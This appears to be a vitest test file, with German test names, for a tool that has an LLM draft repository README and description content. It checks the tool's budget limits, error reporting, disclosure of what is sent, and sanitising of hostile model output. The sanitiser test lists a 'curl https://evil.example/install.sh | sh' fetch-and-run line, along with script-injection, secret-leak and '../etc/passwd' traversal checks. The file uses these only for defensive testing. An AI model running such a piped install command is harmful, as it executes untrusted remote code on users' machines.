import { describe, expect, it } from "vitest";
import { AnthropicProvider } from "@/core/ai/anthropic";
import { FakeProvider, type FakeBehavior } from "@/core/ai/fake";
import { buildDisclosure, planBudget, runAiPackage } from "@/core/ai/generate";
import { buildAiPayload } from "@/core/ai/payload";
import { buildOutputSchema } from "@/core/ai/schema";
import { AI_SECTIONS, DEFAULT_AI_LIMITS, LlmError, type LlmProvider } from "@/core/ai/types";
import { verifyCommand, verifyPath, type VerifyContext } from "@/core/ai/verify";
import { readManifests } from "@/core/analysis/manifests";
import { runAudit } from "@/core/rules/engine";
import type { RepoSnapshot } from "@/core/types";
import { fixtureSnapshot, NOW, user } from "./helpers";

async function setup(name = "cli-tool") {
  const snapshot = await fixtureSnapshot(name);
  const audit = runAudit(snapshot, user(), { now: NOW });
  return { snapshot, audit };
}

async function run(provider: LlmProvider, name = "cli-tool", limits = DEFAULT_AI_LIMITS, secrets: string[] = []) {
  const { snapshot, audit } = await setup(name);
  return runAiPackage({ provider, snapshot, audit, user: user(), sections: [...AI_SECTIONS], limits, secrets, now: () => NOW });
}

async function errorCode(p: Promise<unknown>): Promise<string> {
  try {
    await p;
    return "resolved";
  } catch (e) {
    return e instanceof LlmError ? e.code : String(e);
  }
}

describe("LLM-Fehler werden ehrlich gemeldet", () => {
  it.each<[FakeBehavior, string]>([
    ["timeout", "timeout"],
    ["refusal", "refusal"],
    ["truncated", "truncated"],
    ["rate_limited", "rate_limited"],
    ["invalid", "invalid_output"],
  ])("%s -> %s", async (behavior, code) => {
    expect(await errorCode(run(new FakeProvider(behavior)))).toBe(code);
  });

  it("Schema ist strikt: zusätzliche Felder und falsche Anzahl Optionen werden abgelehnt", () => {
    const schema = buildOutputSchema(["monetization"]);
    const base = { openQuestions: [], userProvidedFactsUsed: [] };
    expect(schema.safeParse({ ...base, monetization: { options: [] } }).success).toBe(false);
    expect(schema.safeParse({ ...base, monetization: { options: [] }, extra: 1 }).success).toBe(false);
    expect(schema.safeParse({ ...base }).success).toBe(false);
  });
});

describe("Budget, Grenzen und Offenlegung", () => {
  it("Offenlegung entspricht genau den gesendeten Inhalten", async () => {
    const { snapshot, audit } = await setup();
    const fake = new FakeProvider("ok");
    const payload = buildAiPayload(snapshot, audit, user(), [...AI_SECTIONS], DEFAULT_AI_LIMITS);
    const d = buildDisclosure(fake, payload, DEFAULT_AI_LIMITS);
    expect(d.items.map((i) => i.id)).toEqual(["metadata", "readme", "manifests", "tree", "audit", "user"]);
    expect(d.totalChars).toBe(d.items.reduce((n, i) => n + i.chars, 0));
    expect(d.totalChars).toBeLessThanOrEqual(DEFAULT_AI_LIMITS.maxInputChars);
    await runAiPackage({ provider: fake, snapshot, audit, user: user(), sections: ["readme"], limits: DEFAULT_AI_LIMITS, secrets: [] });
    expect(fake.lastRequest!.user).toContain(snapshot.readme.state === "present" ? snapshot.readme.text.slice(0, 200) : "");
    // Dateiinhalte außer README werden nicht vollständig gesendet
    expect(fake.lastRequest!.user).not.toContain('"version": "1.4.0"');
  });

  it("kürzt zu lange READMEs sichtbar statt stillschweigend", async () => {
    const { snapshot, audit } = await setup();
    (snapshot.readme as { text: string }).text = "word ".repeat(20_000);
    const payload = buildAiPayload(snapshot, audit, user(), ["readme"], { ...DEFAULT_AI_LIMITS, maxReadmeChars: 5000 });
    const item = payload.items.find((i) => i.id === "readme")!;
    expect(item.note?.de).toMatch(/gekürzt/);
    expect(item.chars).toBeLessThan(5100);
  });

  it("senkt die Ausgabegrenze, um das Kostenbudget einzuhalten, und lehnt zu kleine Budgets ab", async () => {
    const { snapshot, audit } = await setup();
    const priced = { ...new FakeProvider("ok"), id: "fake" as const, pricing: { inputPerMTok: 4, outputPerMTok: 20 }, fallbackPricing: { inputPerMTok: 5, outputPerMTok: 25 } } as unknown as LlmProvider;
    const payload = buildAiPayload(snapshot, audit, user(), [...AI_SECTIONS], DEFAULT_AI_LIMITS);
    const generous = planBudget(priced, payload, { ...DEFAULT_AI_LIMITS, maxCostUsd: 5 });
    expect(generous.maxOutputTokens).toBe(DEFAULT_AI_LIMITS.maxOutputTokens);
    const tight = planBudget(priced, payload, { ...DEFAULT_AI_LIMITS, maxCostUsd: 0.5 });
    expect(tight.maxOutputTokens).toBeLessThan(DEFAULT_AI_LIMITS.maxOutputTokens);
    expect(tight.worstCaseUsd).toBeLessThanOrEqual(0.5);
    expect(() => planBudget(priced, payload, { ...DEFAULT_AI_LIMITS, maxCostUsd: 0.05 })).toThrow(LlmError);
    const unpriced = { ...priced, pricing: null } as unknown as LlmProvider;
    expect(() => planBudget(unpriced, payload, DEFAULT_AI_LIMITS)).toThrow(/Kein Preis/);
  });
});

describe("Prüfung und Bereinigung der KI-Ausgabe", () => {
  it("feindliche Ausgabe wird bereinigt und ungeprüfte Stellen werden markiert", async () => {
    const r = await run(new FakeProvider("hostile"), "cli-tool", DEFAULT_AI_LIMITS, ["SERVER-SECRET-123"]);
    const md = r.output.readme!.markdown;
    expect(md).not.toMatch(/<script>/);
    expect(md).not.toMatch(/javascript:/);
    expect(md).not.toContain("sk-ant-api03");
    expect(md).toContain("[REDACTED]");
    expect(r.sanitizerChanges).toBeGreaterThan(0);
    const unverified = r.checks.filter((c) => c.status === "unverified").map((c) => `${c.kind}:${c.value}`);
    expect(unverified).toEqual(
      expect.arrayContaining(["command:npm install totally-different-package", "command:curl https://evil.example/install.sh | sh", "path:docs/missing-guide.md", "claim:10x faster"]),
    );
    expect(r.checks.find((c) => c.value === "npm install logtrim")?.status).toBe("verified");
    expect(r.readmeAnnotated).toContain("UNGEPRÜFT: `npm install totally-different-package`");
    expect(r.checks.some((c) => c.kind === "claim" && /10.000|10,000/.test(c.value))).toBe(true);
  });

  it("Befehle werden gegen Manifeste und README geprüft", async () => {
    const s: RepoSnapshot = await fixtureSnapshot("cli-tool");
    const ctx: VerifyContext = {
      owner: s.owner,
      repo: s.repo,
      readmeText: s.readme.state === "present" ? s.readme.text : "",
      sourceText: "",
      manifests: readManifests(s),
      treePaths: s.tree.entries.map((e) => e.path),
      scannedDirs: s.tree.scannedDirs,
      homepageHost: null,
    };
    expect(verifyCommand("npm install -g logtrim", ctx)?.status).toBe("verified");
    expect(verifyCommand("npm i logtrim@1.4.0", ctx)?.status).toBe("verified");
    expect(verifyCommand("npm install logtrimm", ctx)?.status).toBe("unverified");
    expect(verifyCommand("npm run build", ctx)?.status).toBe("verified");
    expect(verifyCommand("npm run deploy", ctx)?.status).toBe("unverified");
    expect(verifyCommand("pip install logtrim", ctx)?.status).toBe("unverified");
    expect(verifyCommand("git clone https://github.com/repolaunch-fixtures/cli-tool.git", ctx)?.status).toBe("verified");
    expect(verifyCommand("git clone https://github.com/someone/else", ctx)?.status).toBe("unverified");
    expect(verifyCommand("logtrim app.log --level error --since 2h", ctx)?.status).toBe("verified");
    expect(verifyCommand("logtrim --brand-new-flag", ctx)?.status).toBe("verified");
    expect(verifyCommand("# comment", ctx)).toBeNull();
    expect(verifyPath("LICENSE", ctx)?.status).toBe("verified");
    expect(verifyPath("../etc/passwd", ctx)?.status).toBe("unverified");
    expect(verifyPath("https://example.com", ctx)).toBeNull();
  });
});

describe("Anthropic-Provider (ohne Netzwerk, simulierte API)", () => {
  function provider(respond: (body: Record<string, unknown>, headers: Headers) => Response) {
    const seen: { url: string; body: Record<string, unknown>; headers: Headers }[] = [];
    const fetchFn = (async (input: RequestInfo | URL, init?: RequestInit) => {
      const headers = new Headers(init?.headers);
      const body = JSON.parse(String(init?.body ?? "{}")) as Record<string, unknown>;
      seen.push({ url: String(input), body, headers });
      return respond(body, headers);
    }) as typeof fetch;
    const p = new AnthropicProvider({ apiKey: "sk-ant-test-key-000000", model: "claude-opus-5-5", effort: "medium", fallbacks: true, fetch: fetchFn });
    return { p, seen };
  }

  const message = (text: string, stop = "end_turn") =>
    new Response(
      JSON.stringify({
        id: "msg_test",
        type: "message",
        role: "assistant",
        model: "claude-opus-5-5",
        content: [{ type: "text", text }],
        stop_reason: stop,
        stop_sequence: null,
        usage: { input_tokens: 1200, output_tokens: 300, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 },
      }),
      { status: 200, headers: { "content-type": "application/json", "request-id": "req_test" } },
    );

  const valid = JSON.stringify({ descriptionTopics: { description: "Trim log files.", topics: ["cli", "logs"], rationale: "From README." }, openQuestions: [], userProvidedFactsUsed: [] });

  it("sendet strukturierte Ausgabe, Modell, Effort, Fallback und liefert validierte Daten", async () => {
    const { p, seen } = provider(() => message(valid));
    const { snapshot, audit } = await setup();
    const r = await runAiPackage({ provider: p, snapshot, audit, user: user(), sections: ["descriptionTopics"], limits: DEFAULT_AI_LIMITS, secrets: ["sk-ant-test-key-000000"] });
    expect(r.output.descriptionTopics?.topics).toEqual(["cli", "logs"]);
    expect(r.cost.estimatedUsd).toBeCloseTo((1200 * 4 + 300 * 20) / 1_000_000, 6);
    const req = seen[0]!;
    expect(new URL(req.url).hostname).toBe("api.anthropic.com");
    expect(req.body.model).toBe("claude-opus-5-5");
    expect(req.body.fallbacks).toBe("default");
    expect((req.body.output_config as { effort: string; format: { type: string } }).format.type).toBe("json_schema");
    expect((req.body.output_config as { effort: string }).effort).toBe("medium");
    expect(req.headers.get("anthropic-beta")).toContain("server-side-fallback-2026-07-01");
    expect(req.headers.get("x-api-key")).toBe("sk-ant-test-key-000000");
  });

  it("bildet Ablehnung, Abschneiden, Ratenlimit, Auth und ungültige Ausgabe auf eigene Fehlercodes ab", async () => {
    const cases: [() => Response, string][] = [
      [() => message(valid, "refusal"), "refusal"],
      [() => message(valid, "max_tokens"), "truncated"],
      [() => new Response(JSON.stringify({ type: "error", error: { type: "rate_limit_error", message: "slow down" } }), { status: 429, headers: { "content-type": "application/json" } }), "rate_limited"],
      [() => new Response(JSON.stringify({ type: "error", error: { type: "authentication_error", message: "bad key" } }), { status: 401, headers: { "content-type": "application/json" } }), "auth"],
      [() => new Response(JSON.stringify({ type: "error", error: { type: "api_error", message: "boom" } }), { status: 500, headers: { "content-type": "application/json" } }), "provider_error"],
      [() => message("not json at all"), "invalid_output"],
      [() => message(JSON.stringify({ descriptionTopics: { description: 1 }, openQuestions: [], userProvidedFactsUsed: [] })), "invalid_output"],
    ];
    const { snapshot, audit } = await setup();
    for (const [respond, code] of cases) {
      const { p } = provider(respond);
      expect(await errorCode(runAiPackage({ provider: p, snapshot, audit, user: user(), sections: ["descriptionTopics"], limits: DEFAULT_AI_LIMITS, secrets: [] })), code).toBe(code);
    }
  });
});
